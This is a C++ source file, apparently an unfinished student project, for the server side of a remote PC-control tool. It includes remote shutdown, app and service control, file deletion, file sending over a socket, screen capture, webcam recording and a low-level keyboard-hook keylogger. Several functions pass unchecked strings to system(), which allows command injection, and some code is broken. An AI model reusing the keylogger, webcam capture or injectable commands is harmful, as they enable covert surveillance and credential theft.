#include "lib.cpp"
#include <gdiplus.h>
#include <opencv2/opencv.hpp>
#include <opencv2/core.hpp>
#include <opencv2/highgui.hpp>
#include <opencv2/imgcodecs.hpp>
#include <string> 
#include <cstring>
// #define S_OK 0

// Support both Linux and Windows machine
#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <conio.h>
#elif unix
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#endif

using namespace std;
using namespace Gdiplus;

void serverCallback(char buffer[1024], int clientSocket)
{
    cout << "Client: " << buffer << endl; 
    string msg(buffer);
    // "COMMAND$PAYLOAD"  
    //shutdown$ 
    //keylogging$a
    // vector<string> msgArr = splitStr(msg,"$");
    // string command = msgArr[0];
    // string payload = msgArr[1]; 



    // match commands 
    
    send(clientSocket, "ok", strlen("ok"), 0);
}

void shutDownComputer(){
    cout << "Computer will shut down in 30 second!";
    system("C:\\windows\\system32\\shutdown /s /t 30 \n\n");
}   

void restartComputer(){
    cout << "Computer will restart in 30 second!";
    system("C:\\windows\\system32\\shutdown /r /t 30\n\n");
}

bool sendDataToClient(SOCKET s, const string &filePath) 
{
    char buffer[BUFFER_SIZE];

    int f = filePath.find('.');
    string fileType = filePath.substr(f);
    send(s, (char *)&fileType, fileType.length() + 1, 0);

    ifstream file(filePath, ios::binary);
    if (!file.is_open()) 
    {
        cerr << "Could not open file: " << filePath << endl;
        return false;
    }

    cout << "Sending file: " << filePath << " to client." << endl;

    while (file.read(buffer, BUFFER_SIZE) || file.gcount() > 0) 
    {
        int bytesToSend = static_cast<int>(file.gcount());
        if (send(s, buffer, bytesToSend, 0) == SOCKET_ERROR) 
        {
            cerr << "Failed to send data to client." << endl;
            file.close();
            return false;
        }
    }
    file.close();
    cout << "File sent successfully." << endl;
    return true;
}

void sendListApps(SOCKET s) {
    system("wmic product get name,version > listApps.txt");
    Sleep(20000);
    sendDataToClient(s, "listApps.txt");
} 

void startApp(const string &appName) {
    string s = "start " + appName;
    system(s.c_str());
}

void stopApp(const string &appName) {
    string s = "taskkill /IM " + appName + ".exe /F";
    system(s.c_str());
}

void sendListServices(SOCKET s) {
    system("wmic service get name, displayname, state > listServices.txt");
    Sleep(20000);
    sendDataToClient(s, "listApps.txt");
}

void startService(const string &serviceName) {
    string s = "sc start " + serviceName;
    system(s.c_str());
}

void stopService(const string &serviceName) {
    string s = "sc stop " + serviceName;
    system(s.c_str());
}

void deleteFile(const string &filePath) {
    string s = "del " + filePath;
    system(s.c_str());
}

// function that handle png/jpec image
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
    UINT num = 0;   // number of image encoders
    UINT size = 0;  // size of the image encoder array in bytes

    GetImageEncodersSize(&num, &size);
    if(size == 0)
        return -1;

    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)malloc(size);
    if(pImageCodecInfo == NULL)
        return -1;

    GetImageEncoders(num, size, pImageCodecInfo);

    for(UINT j = 0; j < num; j++){
        if(wcscmp(pImageCodecInfo[j].MimeType, format) == 0){
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}


// CaptureScreen
void captureScreen(const string &file_path){
    //HDC stand for handle to device context it use to obtain graphical component
    HDC hdcScreen = GetDC(NULL); 
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
    int width = GetSystemMetrics(SM_CXSCREEN); // get the width of the Screen
    int height = GetSystemMetrics(SM_CYSCREEN); // get the height of the Screen
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height); // this is a handle to GDI
    //Initialize gdi+
    GdiplusStartupInput gdip;
    ULONG_PTR gdipToken;
    GdiplusStartup(&gdipToken, &gdip, NULL);
    //capture screen
    HGDIOBJ holdBitmap = SelectObject(hdcMemDC, hbmScreen);
    BitBlt(hdcMemDC, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    CLSID encoderID;
    GetEncoderClsid(L"image/png", &encoderID);
    Bitmap bmp(hbmScreen, NULL);
    std::wstring wide_path(file_path.begin(), file_path.end());
    bmp.Save(wide_path.c_str(), &encoderID, NULL);
    SOCKET s;

    if(sendDataToClient(s, file_path))
        cout << "Screen capture has been sent to client!" << endl;
    else
        cout << "Sending fail!" << endl;

    //clean up
    SelectObject(hdcMemDC, holdBitmap);
    DeleteObject(hbmScreen);
    DeleteDC(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);
    GdiplusShutdown(gdipToken);
}


//Recording Webcam
void recordVideo(const std::string& outputFileName, int frameWidth, int frameHeight) {
    //Open webcam
    cv::VideoCapture cap(0);
    
    // Check if the camera opened successfully
    if (!cap.isOpened()) {
        std::cerr << "Error: Could not open camera." << std::endl;
        return;
    }

    // Create a VideoWriter object to save the video to a file
    cv::VideoWriter writer(outputFileName, cv::VideoWriter::fourcc('M','J','P','G'), 30, cv::Size(frameWidth, frameHeight));

    // Check if the writer is opened successfully
    if (!writer.isOpened()) {
        std::cerr << "Error: Could not open the video file for writing." << std::endl;
        return;
    }

    // Start capturing and writing frames to the file
    cv::Mat frame;
    while (true) {
        // Capture a new frame from the webcam
        cap >> frame;

        // If the frame is empty, break out of the loop
        if (frame.empty()) {
            std::cerr << "Error: Failed to capture frame." << std::endl;
            break;
        }
        // Write the frame to the video file
        writer.write(frame);

        // Display the frame in a window
        cv::imshow("Recording", frame);

        // Break the loop if the user presses the 'q' key
        if (cv::waitKey(1) == 'q') {
            break;
        }
    }

    // Release the camera and writer when done
    cap.release();
    writer.release();

    // Close all OpenCV windows
    cv::destroyAllWindows();
}

void saveRecording(){
    cv::VideoCapture cap(0);
    if (!cap.isOpened()) {
        std::cerr << "Error: Could not open camera." << std::endl;
        return;
    }

    // Get the frame width and height
    int frameWidth = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
    int frameHeight = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));

    // Call the recordVideo function
    recordVideo("output.avi", frameWidth, frameHeight);

}

//capture key stroke
void Keystroke(int key){
    ofstream logfile;
    logfile.open("keylog.txt", ios::app);

    if(key == VK_BACK)
        logfile << "[BACKSPACE]";
    else if(key == VK_RETURN)
        logfile << "[ENTER]";
    else if(key == VK_SPACE)
        logfile << " ";
    else if(key == VK_TAB)
        logfile << "[TAB]";
    else if(key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
        logfile << "[SHIFT]";
    else if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
        logfile << "[CTRL]";
    else if(key == VK_ESCAPE)
        logfile << "[ESC]";
    else if(key == VK_OEM_PERIOD)
        logfile << ".";
    else if(key >= 'A' && key <= 'Z')
        logfile << (char)key;
    else if(key >= '0' && key <= '9')
        logfile << (char)key;
    else
        logfile << "[" << key << "]";
    logfile.close();
}

LRESULT CALLBACK KeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam){
    if(nCode >= 0 && wParam == WM_KEYDOWN){
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyBoard->vkCode;
        Keystroke(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
//logKeyStrokeFunction
void logKeyStroke(){
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardProc, NULL, 0);
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyboardHook);
}

int main() {
#ifdef _WIN32
    WSADATA wsa;

    // Khởi tạo winsock
    std::cout << "Initializing Winsock..." << std::endl;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        std::cout << "Failed. Error Code: " << WSAGetLastError() << std::endl;
        return 1;
    }
#endif
    // Socket socket;
    // socket.hostServer();
    // socket.listenForConnection(&serverCallback);
    
     captureScreen("E:\\ProjectMMT\\ktlt-rcpc\\screenshot.png"); 


    
    // TEsTING EFATURES 
    // loi dll ko chay dc 
    // shut down/reset 
    // shutdown() 
    // restartComputer();


    // list app 
    // system("wmic product get name,version > listApps.txt"); 

    // start/stop app
    // startApp("notepad"); 
    // stopApp("notepad"); 

    // list services 
    // system("wmic service get name, displayname, state > listServices.txt");

    // start/stop services
    // startService("abc") 
    // stopService("abc") 



    // get file 
    // sendDataToClient() 

    //delete file 
    //  deleteFile("path");

    // screen shot 
    // captureScreen("D:\\Development\\ktlt-rcpc-master\\ktlt-rcpc\\screenshot.png");  
 
    // record webcam   
    // saveRecord()

    // keylogger  
    // ??


    return 0;
}
